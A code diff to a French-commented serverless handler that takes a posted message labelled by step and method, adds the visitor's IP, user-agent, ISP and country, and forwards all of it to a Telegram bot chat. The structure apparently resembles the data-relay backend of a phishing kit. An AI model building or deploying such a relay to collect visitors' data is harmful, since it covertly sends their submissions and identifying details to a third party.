@@ -6,17 +6,15 @@ const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';
 
 export const config = {
   api: {
-    bodyParser: false,  // on lit nous-mêmes le corps (JSON ou texte)
+    bodyParser: false,  // on lit nous-mêmes le body
   },
 };
 
-// fonction de lecture du body en JSON ou en texte brut
+// lit JSON ou texte brut
 async function readBody(req) {
   const contentType = req.headers['content-type'] || '';
   const chunks = [];
-  for await (const chunk of req) {
-    chunks.push(chunk);
-  }
+  for await (const chunk of req) chunks.push(chunk);
   const raw = Buffer.concat(chunks).toString();
   if (contentType.includes('application/json')) {
     try {
@@ -27,6 +25,7 @@ async function readBody(req) {
   return raw;
 }
 
+// lookup ISP / pays
 async function geoLookup(ip) {
   let isp = 'inconnue', country = 'inconnue', countryCode = '';
   try {
@@ -67,6 +66,7 @@ async function geoLookup(ip) {
   return { isp, countryCode, country };
 }
 
+// nom complet du pays
 function fullCountryName(codeOrName) {
   if (!codeOrName) return 'inconnue';
   if (codeOrName.length === 2) {
@@ -92,45 +92,56 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method Not Allowed' });
   }
 
-  // 1️⃣ On lit d'abord ton message (Étape, Méthode, Choix du client…)
+  // 1️⃣ Lecture du message libre (Étape, Méthode, Choix du client…)
   const message = (await readBody(req)).trim();
   if (!message) {
     return res.status(400).json({ error: 'Missing message' });
   }
 
-  // 2️⃣ IP + UA
+  // 2️⃣ IP et User-Agent
   const forwarded = req.headers['x-forwarded-for'];
   const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
   const ua        = req.headers['user-agent'] || 'inconnu';
 
-  // 3️⃣ Geo
+  // 3️⃣ Geo Lookup
   const { isp, countryCode, country } = await geoLookup(ip);
   const countryDisplay = fullCountryName(country || countryCode);
 
-  // 4️⃣ Date & heure
+  // 4️⃣ Date & heure en FR avec 2 chiffres pour l’année
   const now  = new Date();
   const date = now.toLocaleDateString('fr-FR', {
-    day: '2-digit', month: '2-digit', year: 'numeric'
+    day:   '2-digit',
+    month: '2-digit',
+    year:  '2-digit'
   });
   const time = now.toLocaleTimeString('fr-FR', {
-    hour: '2-digit', minute: '2-digit', second: '2-digit'
+    hour:   '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
   });
 
-  // 5️⃣ Construction du texte brut à envoyer
-  let text = `${message}\n\n`;        // ton message en premier
-  text += `IP : ${ip}\n`;
-  text += `- ISP Client   : ${isp}\n`;
-  text += `- Pays Client  : ${countryDisplay}\n`;
-  text += `- User-Agent   : ${ua}\n`;
-  text += `- Date & heure : ${date} ${time}\n`;
-  text += `©️ ${now.getFullYear()}`;
+  // 5️⃣ Construction du texte
+  const [header, ...rawLines] = message.split('\n');
+  let text = `📝 ${header.trim()}\n`;
+  rawLines.forEach(l => {
+    if (l.trim()) text += `${l.trim()}\n`;
+  });
+  text += `\n`;  // séparation
 
-  // 6️⃣ Envoi sur Telegram en plain text
+  text += `🗓️ Date & heure : ${date}, ${time}\n`;
+  text += `🌐 IP Client     : ${ip}\n`;
+  text += `🔎 ISP Client    : ${isp}\n`;
+  text += `🌍 Pays Client   : ${countryDisplay}\n`;
+  text += `📍 User-Agent    : ${ua}\n`;
+  text += `©️ ${now.getFullYear()} ©️`;
+
+  // 6️⃣ Envoi sur Telegram (texte brut)
   const payload = {
     chat_id: CHAT,
     text,
     disable_web_page_preview: true
   };
+
   const tg = await fetch(
     `https://api.telegram.org/bot${TOKEN}/sendMessage`,
     {
@@ -139,6 +150,7 @@ export default async function handler(req, res) {
       body: JSON.stringify(payload),
     }
   );
+
   const raw = await tg.text();
   return res.status(tg.ok ? 200 : tg.status).json({ ok: tg.ok, full: raw });
 }
